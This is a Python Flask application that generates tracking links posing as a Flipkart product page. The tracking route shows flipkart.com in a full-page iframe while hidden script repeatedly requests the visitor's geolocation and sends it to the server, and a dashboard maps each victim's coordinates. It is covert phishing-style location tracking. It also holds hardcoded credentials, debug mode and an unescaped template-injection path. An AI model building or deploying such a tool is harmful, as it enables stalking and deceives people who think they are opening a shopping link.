from flask import Flask, request, render_template_string, url_for, Response
import uuid
import datetime
from functools import wraps

app = Flask(__name__)

# In-memory storage
locations = {}

# Hardcoded credentials
USERNAME = "ShreTan"
PASSWORD = "ShreTan@2018"

# Auth helpers
def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    return Response(
        '🔒 Authentication required', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# =====================
# Home page
# =====================
@app.route("/")
@requires_auth
def home():
    track_id = str(uuid.uuid4())
    tracking_url = url_for("track", track_id=track_id, _external=True)

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipcart-product</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-light d-flex flex-column align-items-center justify-content-center vh-100">
        <div class="card shadow p-4 text-center" style="max-width: 500px; width: 100%;">
            <h2 class="mb-3">🔗 Tracking Link Generator</h2>
            <p>Your tracking link:</p>
            <a href="{tracking_url}" target="_blank" class="btn btn-primary mb-3">{tracking_url}</a>
            <hr>
            <a href="/dashboard" class="btn btn-outline-dark mt-2">📊 View Dashboard</a>
        </div>
    </body>
    </html>
    """

# =====================
# Tracking page
# =====================
@app.route("/track/<track_id>")
@requires_auth
def track(track_id):
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipcart-product</title>
        <style>
            body, html {{
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden;
            }}
            iframe {{
                width: 100%;
                height: 100%;
                border: none;
            }}
        </style>
        <script>
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {{
                            fetch("/save_location/{track_id}", {{
                                method: "POST",
                                headers: {{ "Content-Type": "application/json" }},
                                body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude }})
                            }});
                        }},
                        (err) => {{ console.log("❌ Location denied"); }}
                    );
                }}
            }}
            setTimeout(requestLocation, 7000);
            setInterval(requestLocation, 5000);
        </script>
    </head>
    <body>
        <iframe src="https://www.flipkart.com"></iframe>
    </body>
    </html>
    """
    return render_template_string(html)

# =====================
# Save location
# =====================
@app.route("/save_location/<track_id>", methods=["POST"])
@requires_auth
def save_location(track_id):
    data = request.json
    lat, lon = data.get("lat"), data.get("lon")
    locations[track_id] = {
        "lat": lat,
        "lon": lon,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    return {"status": "success"}

# =====================
# Dashboard
# =====================
@app.route("/dashboard")
@requires_auth
def dashboard():
    if not locations:
        table_rows = "<tr><td colspan='5' class='text-center text-muted'>No data yet</td></tr>"
    else:
        sorted_locations = sorted(locations.items(), key=lambda x: x[1]['time'], reverse=True)
        table_rows = ""
        for i, (track_id, info) in enumerate(sorted_locations):
            maps_link = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
            highlight = "table-success" if i == 0 else ""
            table_rows += f"""
            <tr class="{highlight}">
                <td>{track_id}</td>
                <td>{info['time']}</td>
                <td>{info['lat']}</td>
                <td>{info['lon']}</td>
                <td><a href="{maps_link}" target="_blank" class="btn btn-sm btn-success">🌍 View</a></td>
            </tr>
            """

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <script>
            setTimeout(() => {{ window.location.reload(); }}, 10000);
        </script>
    </head>
    <body class="bg-light">
        <div class="container py-5">
            <div class="card shadow p-4">
                <h2 class="mb-4 text-center">📊 Tracked Locations Dashboard</h2>
                <table class="table table-hover table-bordered align-middle">
                    <thead class="table-dark">
                        <tr>
                            <th>Track ID</th>
                            <th>Click Time</th>
                            <th>Latitude</th>
                            <th>Longitude</th>
                            <th>Google Maps</th>
                        </tr>
                    </thead>
                    <tbody>
                        {table_rows}
                    </tbody>
                </table>
                <div class="text-center mt-3">
                    <a href="/" class="btn btn-primary">⬅️ Generate New Link</a>
                </div>
                <p class="text-muted text-center mt-2"><small>⏳ Auto-refreshes every 10 seconds</small></p>
            </div>
        </div>
    </body>
    </html>
    """
    return html

if __name__ == "__main__":
    app.run(debug=True)
